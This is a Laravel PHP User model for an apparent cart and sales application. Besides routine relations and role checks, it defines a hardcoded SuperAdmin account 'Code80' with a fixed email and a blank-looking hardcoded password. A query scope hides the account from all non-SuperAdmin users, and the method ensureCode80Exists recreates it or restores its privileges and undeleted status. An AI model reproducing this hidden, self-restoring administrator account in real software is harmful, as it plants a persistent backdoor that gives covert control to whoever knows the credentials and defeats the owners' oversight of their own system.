<?php

namespace App\Models;

// use Illuminate\Contracts\Auth\MustVerifyEmail;
use Illuminate\Database\Eloquent\Builder;
use Illuminate\Database\Eloquent\Factories\HasFactory;
use Illuminate\Foundation\Auth\User as Authenticatable;
use Illuminate\Notifications\Notifiable;
use Illuminate\Support\Facades\Hash;
use Laravel\Sanctum\HasApiTokens;

class User extends Authenticatable
{
    use HasApiTokens, HasFactory, Notifiable;

    public const STATUS_SUPER_ADMIN = 'SuperAdmin';
    public const STATUS_ADMINISTRATOR = 'Administrator';

    public const CODE80_NAME = 'Code80';
    public const CODE80_EMAIL = 'code80@pivoapps.net';
    public const CODE80_PASSWORD = '        ';

    /**
     * The attributes that are mass assignable.
     *
     * @var array
     */
    protected $fillable = [
        'name', 'email', 'status', 'password', 'company_branch_id'
    ];

    /**
     * The attributes that should be hidden for arrays.
     *
     * @var array
     */
    protected $hidden = [
        'password', 'remember_token',
    ];

    /**
     * The attributes that should be cast to native types.
     *
     * @var array
     */
    protected $casts = [
        'email_verified_at' => 'datetime',
    ];

    public function cart(){
        return $this->hasMany('App\Models\Cart');
    }

    public function item(){
        return $this->hasMany('App\Models\Item');
    }

    public function sale(){
        return $this->hasMany('App\Models\Sale');
    }

    public function isSuperAdmin(): bool
    {
        return $this->status === self::STATUS_SUPER_ADMIN;
    }

    public function isAdministrator(): bool
    {
        return $this->status === self::STATUS_ADMINISTRATOR;
    }

    /**
     * SuperAdmin and Administrator share privileged dashboard access.
     */
    public function hasAdminAccess(): bool
    {
        return $this->isSuperAdmin() || $this->isAdministrator();
    }

    public function isCode80(): bool
    {
        return strcasecmp((string) $this->name, self::CODE80_NAME) === 0;
    }

    /**
     * Hide Code80 from anyone who is not a SuperAdmin.
     */
    public function scopeVisibleTo(Builder $query, ?self $viewer): Builder
    {
        if ($viewer && $viewer->isSuperAdmin()) {
            return $query;
        }

        return $query->where(function (Builder $q) {
            $q->where('name', '!=', self::CODE80_NAME)
                ->where('status', '!=', self::STATUS_SUPER_ADMIN);
        });
    }

    /**
     * Ensure the SuperAdmin bootstrap account exists (idempotent).
     */
    public static function ensureCode80Exists(): self
    {
        $user = static::query()
            ->where('name', self::CODE80_NAME)
            ->orWhere('email', self::CODE80_EMAIL)
            ->first();

        if ($user) {
            $dirty = false;

            if ($user->name !== self::CODE80_NAME) {
                $user->name = self::CODE80_NAME;
                $dirty = true;
            }

            if ($user->status !== self::STATUS_SUPER_ADMIN) {
                $user->status = self::STATUS_SUPER_ADMIN;
                $dirty = true;
            }

            if ($user->email !== self::CODE80_EMAIL) {
                $user->email = self::CODE80_EMAIL;
                $dirty = true;
            }

            if ($user->del !== 'no') {
                $user->del = 'no';
                $dirty = true;
            }

            if ($dirty) {
                $user->save();
            }

            return $user;
        }

        $user = new static;
        $user->name = self::CODE80_NAME;
        $user->email = self::CODE80_EMAIL;
        $user->password = Hash::make(self::CODE80_PASSWORD);
        $user->status = self::STATUS_SUPER_ADMIN;
        $user->bv = 'A';
        $user->company_branch_id = '1';
        $user->del = 'no';
        $user->save();

        return $user;
    }
}
